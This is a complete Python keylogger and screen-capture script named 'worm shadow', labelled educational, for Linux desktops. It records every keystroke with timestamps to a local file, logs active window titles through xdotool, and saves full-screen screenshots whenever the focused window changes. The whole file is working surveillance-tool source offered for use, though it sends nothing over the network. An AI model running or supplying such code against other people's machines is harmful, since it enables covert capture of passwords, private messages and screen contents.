#!/usr/bin/env python3
# worm shadow — linux all-in-one logger (educational)
import os, sys, time, threading, subprocess, datetime, re, signal
from pathlib import Path

try:
    from pynput import keyboard
except ImportError:
    print("install pynput: pip install pynput")
    sys.exit(1)

try:
    import mss
    import mss.tools
except ImportError:
    print("install mss: pip install mss")
    sys.exit(1)

# ---------- config ----------
LOG_DIR = Path("logs")
SHOT_DIR = Path("screenshots")
KEY_LOG = LOG_DIR / "keylog.txt"
WIN_LOG = LOG_DIR / "windowlog.txt"
SCREENSHOT_ENABLED = False

# ---------- helpers ----------
def ensure_dirs():
    LOG_DIR.mkdir(exist_ok=True)
    SHOT_DIR.mkdir(exist_ok=True)

def timestamp():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def safe_filename(s):
    s = re.sub(r'[^\w\s-]', '', s).strip()
    s = re.sub(r'[-\s]+', '_', s)
    return s[:80] or "unknown"

def get_active_window_title():
    """Return active window title via xdotool. None if fails."""
    try:
        out = subprocess.check_output(
            ["xdotool", "getactivewindow", "getwindowname"],
            stderr=subprocess.DEVNULL,
            timeout=1
        )
        return out.decode(errors="ignore").strip()
    except Exception:
        return None

# ---------- keylogger ----------
def log_key(key):
    try:
        with open(KEY_LOG, "a", encoding="utf-8") as f:
            if hasattr(key, 'char') and key.char is not None:
                f.write(f"{timestamp()} | {key.char}\n")
            else:
                f.write(f"{timestamp()} | [{key}]\n")
    except Exception:
        pass

def on_press(key):
    log_key(key)

def start_keylogger():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    return listener

# ---------- screenshots ----------
def take_screenshot(title):
    if not SCREENSHOT_ENABLED:
        return
    try:
        with mss.mss() as sct:
            monitor = sct.monitors[1]  # primary monitor
            img = sct.grab(monitor)
            ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            fname = f"{ts}_{safe_filename(title)}.png"
            path = SHOT_DIR / fname
            mss.tools.to_png(img.rgb, img.size, output=str(path))
    except Exception:
        pass

# ---------- window monitor ----------
def window_monitor(stop_event):
    last_title = None
    while not stop_event.is_set():
        title = get_active_window_title()
        if title and title != last_title:
            last_title = title
            try:
                with open(WIN_LOG, "a", encoding="utf-8") as f:
                    f.write(f"{timestamp()} | {title}\n")
            except Exception:
                pass
            if SCREENSHOT_ENABLED:
                take_screenshot(title)
        time.sleep(1)

# ---------- main ----------
def main():
    global SCREENSHOT_ENABLED
    ensure_dirs()

    print("[worm shadow] linux all-in-one logger")
    print(f"logs:        {LOG_DIR.resolve()}")
    print(f"screenshots: {SHOT_DIR.resolve()}")

    choice = input("Enable screenshots? (y/N): ").strip().lower()
    if choice != 'y':
        print("[worm shadow] no screenshots. closing.")
        sys.exit(0)

    SCREENSHOT_ENABLED = True
    print("[worm shadow] screenshots enabled. logging keys and windows. ctrl+c to stop.")

    stop_event = threading.Event()
    listener = start_keylogger()
    wm_thread = threading.Thread(target=window_monitor, args=(stop_event,), daemon=True)
    wm_thread.start()

    try:
        while True:
            time.sleep(0.5)
    except KeyboardInterrupt:
        print("\n[worm shadow] stopping...")
        stop_event.set()
        listener.stop()
        wm_thread.join(timeout=1)
        print("[worm shadow] stopped. later, he.")

if __name__ == "__main__":
    main()
